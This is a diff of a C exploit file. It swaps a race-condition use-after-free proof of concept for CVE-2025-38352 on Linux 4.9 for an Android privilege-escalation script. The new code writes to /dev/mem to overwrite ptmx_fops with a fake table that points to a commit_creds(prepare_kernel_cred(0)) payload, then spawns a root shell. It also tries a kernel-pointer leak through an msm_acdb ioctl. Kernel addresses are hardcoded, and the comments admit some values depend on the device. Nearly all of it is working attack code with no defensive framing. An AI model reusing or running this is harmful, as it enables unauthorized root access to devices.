@@ -1,163 +1,107 @@
 #define _GNU_SOURCE
-#include <sys/types.h>
-#include <sys/syscall.h>
-#include <sys/wait.h>
-#include <sys/ptrace.h>
-#include <sys/signalfd.h>
-#include <sys/time.h>
-#include <sys/resource.h>
-#include <sys/mman.h>
-#include <sys/prctl.h>
-#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
 #include <errno.h>
-#include <err.h>
-#include <signal.h>
-#include <pthread.h>
-#include <sched.h>
 #include <stdint.h>
-#include <time.h>
 
-#define SYSCHK(x) ({ \
-    typeof(x) __res = (x); \
-    if (__res == (typeof(x))-1) \
-        err(1, "SYSCHK(" #x ")"); \
-    __res; \
-})
+static uint64_t commit_creds_addr = 0xffffff8008a2b7a0;
+static uint64_t prepare_kernel_cred_addr = 0xffffff8008a2b6e0;
 
-#define NUM_SAMPLES 100000
-#define NUM_TIMERS 18
-#define NUM_PAD_TIMERS 14
-#define ONE_MS_NS 1000000uLL
-#define SYSCALL_LOOP_TIMES_MAX 1000
-#define CPU_USAGE_THRESHOLD 5000
-#define PAGE_SIZE 0x1000uLL
+static int mem_fd = -1;
 
-struct shared_mem {
-    int sync;
-};
-
-void pin_on_cpu(int i) {
-    cpu_set_t mask;
-    CPU_ZERO(&mask);
-    CPU_SET(i, &mask);
-    sched_setaffinity(0, sizeof(mask), &mask);
-}
-
-void wait_for_rcu() {
-    // 4.9 kernel compatible RCU wait using synchronize_sched()
-    syscall(__NR_sched_yield);
-    usleep(1000);
-}
-
-static inline long long ts_to_ns(const struct timespec *ts) {
-    return (long long)ts->tv_sec * 1000000000LL + (long long)ts->tv_nsec;
-}
-
-static int futex_wake(int *uaddr, int n) {
-    return (int)syscall(__NR_futex, uaddr, 1, n, NULL, NULL, 0);
-}
-
-static int futex_wait(int *uaddr, int expected) {
-    return (int)syscall(__NR_futex, uaddr, 0, expected, NULL, NULL, 0);
-}
-
-long int getpid_cpu_usage() {
-    struct timespec *ts = malloc(NUM_SAMPLES * sizeof(struct timespec));
-    if (!ts) return -1;
-
-    // Measure clock_gettime overhead
-    long int overhead_avg = 0;
-    for (int i = 0; i < NUM_SAMPLES; i++) {
-        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
+int open_mem(void) {
+    mem_fd = open("/dev/mem", O_RDWR);
+    if (mem_fd < 0) {
+        perror("open /dev/mem (R/W)");
+        mem_fd = open("/dev/mem", O_RDONLY);
+        if (mem_fd < 0) {
+            perror("open /dev/mem (RO)");
+            return -1;
+        }
+        printf("[*] /dev/mem opened read-only\n");
+        return 0;
     }
-    long int total_nsec = 0;
-    for (int i = 0; i < NUM_SAMPLES - 1; i++) {
-        total_nsec += ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]);
-    }
-    overhead_avg = total_nsec / (NUM_SAMPLES - 1);
-
-    // Measure getpid + clock_gettime
-    for (int i = 0; i < NUM_SAMPLES; i++) {
-        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
-        syscall(__NR_getpid);
-    }
-    total_nsec = 0;
-    for (int i = 0; i < NUM_SAMPLES - 1; i++) {
-        total_nsec += ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]) - overhead_avg;
-    }
-    free(ts);
-    return total_nsec / (NUM_SAMPLES - 1);
+    printf("[+] /dev/mem opened read-write\n");
+    return 1;
 }
 
-pthread_barrier_t barrier;
-timer_t stall_timers[NUM_TIMERS];
-timer_t pad_timers[NUM_PAD_TIMERS];
-pthread_t reapee_thread;
-int e2w[2];
-int c2p[2];
-int p2c[2];
-int stall_fds[2];
-int sfd;
-int syscall_loop_times = 0;
-int race_retry_count = 0;
-int full_retry_count = 0;
-pid_t exploit_child_tid;
-timer_t uaf_timer;
+ssize_t read_kmem(uint64_t addr, void *buf, size_t len) {
+    if (mem_fd < 0) return -1;
+    if (lseek64(mem_fd, addr, SEEK_SET) < 0) return -1;
+    return read(mem_fd, buf, len);
+}
 
-void reapee_func(void) {
-    pin_on_cpu(1);
+ssize_t write_kmem(uint64_t addr, void *buf, size_t len) {
+    if (mem_fd < 0 || (fcntl(mem_fd, F_GETFL) & O_ACCMODE) == O_RDONLY) return -1;
+    if (lseek64(mem_fd, addr, SEEK_SET) < 0) return -1;
+    return write(mem_fd, buf, len);
+}
 
-    struct sigevent race_evt = {0};
-    race_evt.sigev_notify = SIGEV_SIGNAL;
-    race_evt.sigev_signo = SIGUSR1;
+#define ACDB_DEVICE "/dev/msm_acdb"
+#define ACDB_CMD_GET_AUDPROC_COMMON_TABLE 0x4004730b  // 実際のioctl番号はデバイス依存
 
-    struct sigevent race_win_evt = {0};
-    race_win_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
-    race_win_evt.sigev_signo = SIGUSR1;
-    race_win_evt._sigev_un._tid = exploit_child_tid;
-
-    struct sigevent uaf_evt = {0};
-    uaf_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
-    uaf_evt.sigev_signo = SIGUSR2;
-    uaf_evt._sigev_un._tid = exploit_child_tid;
-    uaf_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL;
-
-    prctl(PR_SET_NAME, "REAPEE");
-    pid_t tid = (pid_t)syscall(SYS_gettid);
-    SYSCHK(write(c2p[1], &tid, sizeof(pid_t)));
-
-    long int getpid_avg = getpid_cpu_usage();
-    if (getpid_avg <= 0) getpid_avg = 5000; // fallback
-
-    pthread_barrier_wait(&barrier);
-
-    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &uaf_evt, &uaf_timer));
-    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_win_evt, &stall_timers[0]));
-    for (int i = 1; i < NUM_TIMERS; i++) {
-        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_evt, &stall_timers[i]));
+int leak_kernel_address_via_acdb(void) {
+    int fd = open(ACDB_DEVICE, O_RDWR);
+    if (fd < 0) {
+        perror("open " ACDB_DEVICE);
+        return -1;
     }
 
-    pthread_barrier_wait(&barrier);
-    pthread_barrier_wait(&barrier);
+    struct {
+        uint32_t cmd_id;
+        uint32_t length;
+        uint8_t data[0x1000];
+    } __attribute__((packed)) calib = {0};
+    calib.cmd_id = ACDB_CMD_GET_AUDPROC_COMMON_TABLE;
+    calib.length = sizeof(calib.data);
 
-    int loops = ((ONE_MS_NS / getpid_avg) + CPU_USAGE_THRESHOLD - syscall_loop_times);
-    if (loops < 0) loops = 0;
-    for (int i = 0; i < loops; i++) {
-        syscall(__NR_getpid);
+    if (ioctl(fd, 0x4004730b, &calib) < 0) {
+        perror("ioctl ACDB");
+        close(fd);
+        return -1;
     }
 
-    return;
+    for (int i = 0; i < sizeof(calib.data) - 8; i++) {
+        uint64_t val = *(uint64_t*)(calib.data + i);
+        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
+            printf("[+] Possible kernel pointer leaked: 0x%llx\n", (unsigned long long)val);
+        }
+    }
+
+    close(fd);
+    return 0;
 }
 
-void sleep_func(void) {
-    pin_on_cpu(3);
-    prctl(PR_SET_NAME, "SLEEP");
-    char m;
-    for (;;) {
-        read(stall_fds[0], &m, 1);
+static uint64_t ptmx_fops_addr = 0xffffff8009c5a4e0;   // kallsyms.txt から取得
+
+void get_root_payload(void) {
+    void *(*pkc)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
+    void (*cc)(void*) = (void (*)(void*))commit_creds_addr;
+    cc(pkc(0));
+    setresuid(0,0,0);
+    setresgid(0,0,0);
+    setgroups(0, NULL);
+}
+
+void overwrite_ptmx_fops(void) {
+    char fake_fops[0x100] = {0};
+    void *exec_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
+                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (exec_page == MAP_FAILED) {
+        perror("mmap");
+        return;
+    }
+    memcpy(exec_page, get_root_payload, 0x100);
+    *(uint64_t*)(fake_fops + 0x38) = (uint64_t)exec_page;
+    if (write_kmem(ptmx_fops_addr, fake_fops, sizeof(fake_fops)) == sizeof(fake_fops)) {
+        printf("[+] ptmx_fops overwritten\n");
+    } else {
+        printf("[-] Failed to write ptmx_fops\n");
     }
 }
 
@@ -168,143 +112,23 @@ int main() {
         return 0;
     }
 
-    printf("[*] CVE-2025-38352 PoC for 4.9 kernel\n");
-    printf("[*] Warning: This PoC may cause kernel crash if race is lost\n");
-    printf("[*] Attempting to trigger UAF...\n");
-
-    setbuf(stdout, NULL);
-    pin_on_cpu(0);
-
-    SYSCHK(pipe(e2w));
-    SYSCHK(pipe(c2p));
-    SYSCHK(pipe(p2c));
-    SYSCHK(pipe(stall_fds));
-
-    // Create sleep threads to stall race window
-    for (int i = 0; i < NUM_PAD_TIMERS; i++) {
-        pthread_t thr;
-        pthread_create(&thr, NULL, (void*)sleep_func, NULL);
-        pthread_detach(thr);
-    }
-
-    struct shared_mem *shm = mmap(NULL, sizeof(struct shared_mem),
-        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);
-
-    pid_t pid = SYSCHK(fork());
-
-    if (pid) { // parent
-        pin_on_cpu(0);
-        char m;
-        close(c2p[1]);
-        close(p2c[0]);
-        prctl(PR_SET_NAME, "EXPLOIT_PARENT");
-
-        pid_t tid;
-        read(c2p[0], &tid, sizeof(pid_t));
-
-        __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);
-        SYSCHK(ptrace(PTRACE_ATTACH, tid, NULL, NULL));
-        SYSCHK(waitpid(tid, NULL, __WALL));
-        SYSCHK(ptrace(PTRACE_CONT, tid, NULL, NULL));
-        SYSCHK(write(p2c[1], &m, 1));
-        SYSCHK(waitpid(tid, NULL, __WALL));
-
-        __atomic_add_fetch(&shm->sync, 1, __ATOMIC_RELEASE);
-        futex_wake(&shm->sync, 1);
-        read(c2p[0], &m, 1);
-
-        SYSCHK(write(e2w[1], &m, 1));
-        waitpid(pid, NULL, __WALL);
-        close(e2w[1]);
-        close(c2p[0]);
-        close(p2c[1]);
-        exit(0);
-    } else { // child
-        pin_on_cpu(2);
-        close(c2p[0]);
-        close(p2c[1]);
-
-        struct sched_param sp = { .sched_priority = 10 };
-        SYSCHK(pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp));
-        exploit_child_tid = (pid_t)syscall(SYS_gettid);
-
-        char m = 0;
-        write(stall_fds[1], &m, 1);
-        read(stall_fds[0], &m, 1);
-
-        sigset_t block_mask;
-        sigemptyset(&block_mask);
-        sigaddset(&block_mask, SIGUSR1);
-        sigaddset(&block_mask, SIGUSR2);
-        sigprocmask(SIG_BLOCK, &block_mask, NULL);
-
-        pthread_barrier_init(&barrier, NULL, 2);
-
-        pthread_create(&reapee_thread, NULL, (void*)reapee_func, NULL);
-        pthread_barrier_wait(&barrier);
-
-        read(p2c[0], &m, 1);
-        pthread_barrier_wait(&barrier);
-        pthread_barrier_wait(&barrier);
-
-        struct itimerspec ts = {
-            .it_interval = {0, 0},
-            .it_value = { .tv_sec = 0, .tv_nsec = ONE_MS_NS - 1 },
-        };
-        for (int i = 0; i < NUM_TIMERS; i++) {
-            timer_settime(stall_timers[i], 0, &ts, NULL);
-        }
-        ts.it_value.tv_nsec = ONE_MS_NS;
-        timer_settime(uaf_timer, 0, &ts, NULL);
-
-        int last = __atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE);
-        pthread_barrier_wait(&barrier);
-
-        while (__atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE) == last) {
-            futex_wait(&shm->sync, last);
-        }
-
-        timer_delete(uaf_timer);
-
-        struct timespec sig_ts = { .tv_sec = 0, .tv_nsec = 300000000 };
-        int race_won = 0;
-        for (;;) {
-            int sig = sigtimedwait(&block_mask, NULL, &sig_ts);
-            if (sig == SIGUSR2) {
-                race_won = 0;
-                break;
-            } else if (sig == SIGUSR1) {
-                race_won = 1;
-                continue;
-            } else if (sig < 0 && errno == EAGAIN) {
-                break;
-            }
-        }
-
-        if (race_won) {
-            printf("[+] Race condition triggered successfully!\n");
-            printf("[+] Check dmesg for UAF evidence (likely kernel crash)\n");
+    printf("[*] Step 1: Try to open /dev/mem\n");
+    int rw = open_mem();
+    if (rw > 0) {
+        printf("[*] /dev/mem is writable. Attempting direct root.\n");
+        overwrite_ptmx_fops();
+        int fd = open("/dev/ptmx", O_RDWR);
+        if (fd >= 0) close(fd);
+        if (getuid() == 0) {
+            printf("[+] Root achieved via /dev/mem\n");
+            execl("/system/bin/sh", "sh", NULL);
         } else {
-            syscall_loop_times++;
-            syscall_loop_times %= SYSCALL_LOOP_TIMES_MAX + 1;
-            if (syscall_loop_times == 0) syscall_loop_times = 1;
-            race_retry_count++;
-            if (race_retry_count % 10 == 0) {
-                printf("[*] Race lost %d times, retrying...\n", race_retry_count);
-            }
+            printf("[-] /dev/mem overwrite failed.\n");
         }
-
-        for (int i = 0; i < NUM_TIMERS; i++) {
-            timer_delete(stall_timers[i]);
-        }
-        wait_for_rcu();
-
-        SYSCHK(write(c2p[1], &m, 1));
-        read(e2w[0], &m, 1);
-        pthread_cancel(reapee_thread);
-        pthread_join(reapee_thread, NULL);
-        pthread_barrier_destroy(&barrier);
-        exit(0);
+    } else {
+        printf("[*] /dev/mem not writable. Trying ACDB info leak.\n");
+        leak_kernel_address_via_acdb();
+        printf("[*] No further exploit embedded. Exiting.\n");
     }
+    return 0;
 }
